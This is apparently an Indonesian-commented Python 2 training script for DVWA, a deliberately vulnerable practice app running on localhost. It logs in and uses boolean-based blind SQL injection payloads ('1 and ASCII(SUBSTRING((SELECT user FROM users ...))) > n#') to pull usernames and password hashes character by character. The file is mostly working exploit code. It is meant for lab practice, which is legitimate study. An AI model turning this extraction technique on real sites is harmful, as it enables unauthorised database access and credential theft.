'''Program created by
ArkAngels'''

'''NOTE: script ini digunakan untuk tingkat kesulitan medium, jika ingin mengganti tingkat kesulitan ke low, maka tambahkan di bagian find all password dan username di payload setelah 1 tambahkan '(single quote) dan variable inject ganti dari post menjadi get dan data menjadi params. Jangan lupa untuk mengganti juga tingkat kesulitan default di config.inc.php menjadi low atau medium sesuai dengan yang diinginkan'''

from bs4 import BeautifulSoup
import requests, time

usernames = []
passwords = []

s = requests.Session()

def clear():
    print "\n"*40

def mainMenu():
    print "Welcome to Angel's lesson of ezpz DVWA"
    print "========================================"
    print "1. Get all usernames"
    print "2. Get all passwords"
    print "3. Show results"
    print "4. Exit"

'''Function dibawah ini berfungsi untuk meloginkan kita ke DVWA'''
def dvwa_login():

    url = "http://localhost/dvwa/login.php"
    result = s.get(url)
'''Dari kita request ke url diatas, kita mengambil tag html input lalu mencari yang namanya user_token dan kita ambil atribut value'''
    usertoken = BeautifulSoup(result.text, 'html.parser').find('input', {'name':'user_token'}).get('value')
'''bikin payload yang akan kita kirim ke server untuk login'''
    payload={"username":"admin",
            "password":"password",
            "Login":"Login",
            "user_token":usertoken
            }
    result = s.post(url, data=payload)
    print "[+]Attempting to connect to DVWA server . . ."
    time.sleep(2)
    print "[+]Successfully connected to DVWA server . . ."
    time.sleep(1)

def find_username():
    clear()
    dvwa_login()
    url = "http://localhost/dvwa/vulnerabilities/sqli_blind/"
    r = s.get(url)
    print "[+]Attempting to brute force usernames using Blind SQL Injection method on " + url
    print ""
    time.sleep(1)
    soup = BeautifulSoup(r.text, 'html.parser')
    
    limit = 0
    x = 1
    for i in range(0,100):
        username = ""
        index = 1
        compare = ord('/')
        while True:
'''konsep dasar dari boolean-based blind sql injection adalah kita mem-bruteforce compare kita dari payload hingga server return False'''
'''dalam hal ini ASCII akan mengubah yang didalam menjadi ascii lalu SUBSTRING untuk memotong string. SELECT seharusnya bisa dicari di internet lalu LIMIT akan membatasi jumlah output misal LIMIT 0,1 maka akan memunculkan hasil query dari baris 0 sebanyak 1 hasil. lalu hasil ascii dari query tersebut kita bandingkan dengan ascii value tertentu. Jika masih True, kita naikkan lagi comparenya 1, jika masih True naikkan lagi sampai return False'''
            payload = "1 and ASCII(SUBSTRING((SELECT user FROM users LIMIT {},1),{},1)) > {}#".format(limit, index, compare)
            param = {"id":payload, 
                    "Submit":"Submit"}
            inject = s.post(url, data = param)
            soup = BeautifulSoup(inject.text, 'html.parser').find('pre').getText()
            
'''jika masih return True maka ascii compare akan ditambahkan 1'''
            if 'exists' in soup:
                compare += 1
            elif 'MISSING' in soup:
'''jika sudah return False (dalam hal ini DVWA akan return MISSING) maka sedang dimana compare tersebut akan diubah menjadi char dan dimasukkan ke var username (karena jika karakter yang benar ber-ascii 90, dan compare kita adalah 90 juga akan return False karena 90 > 90 == false)'''
                if compare == ord('/'):
                    if len(username) == 0:
                        break
                    print ""
                    usernames.append(username)
                    x += 1
                    break
                username += chr(compare)
                print "[+]Username {}: {}".format(x, username)
                index += 1
                compare = ord('/')
        if len(username) == 0:
            break
        limit += 1


'''gua rasa selebihnya bisa kau pelajari sendiri'''
def find_password():
    clear()
    dvwa_login()
    url = "http://localhost/dvwa/vulnerabilities/sqli_blind/"
    r = s.get(url)
    print "[+]Attempting to brute force passwords using Blind SQL Injection method on " + url
    print ""
    time.sleep(1)
    soup = BeautifulSoup(r.text, 'html.parser')
    
    limit = 0
    x = 1
    for i in range(0,100):
        password = ""
        index = 1
        compare = ord('/')
        while True:
            payload = "1 and ASCII(SUBSTRING((SELECT password FROM users LIMIT {},1),{},1)) > {}#".format(limit, index, compare)
            param = {"id":payload, 
                    "Submit":"Submit"}
            inject = s.post(url, data = param)
            soup = BeautifulSoup(inject.text, 'html.parser').find('pre').getText()
            
            if 'exists' in soup:
                compare += 1
            elif 'MISSING' in soup:
                if compare == ord('/'):
                    if len(password) == 0:
                        break
                    print ""
                    passwords.append(password)
                    x += 1
                    break
                password += chr(compare)
                print "[+]Password {}: {}".format(x, password)
                index += 1
                compare = ord('/')
        if len(password) == 0:
            break
        limit += 1

def header():
    print "="*73
    print "| No.\t|\tUsername\t|\t\tPassword\t\t|"
    print "="*73

def show():
    clear()
    header()
    index = 0
    while True:
        try:
            print "| {}\t|\t{}\t\t|{}\t|".format(index + 1, usernames[index], passwords[index])
            index += 1
        except:
            break
    print "="*73
    raw_input("Press enter to continue. . .")

def main():
    choice = 0
    while choice != 4:
        clear()
        mainMenu()
        try:
            choice = int(raw_input(">> "))
        except:
            choice = 0
        if choice == 1:
            find_username()
        elif choice == 2:
            find_password()
        elif choice == 3:
            show()
        elif choice == 4:
            print "Bye Noobs~!"
            break
'''question? go ahead and ask'''
main()
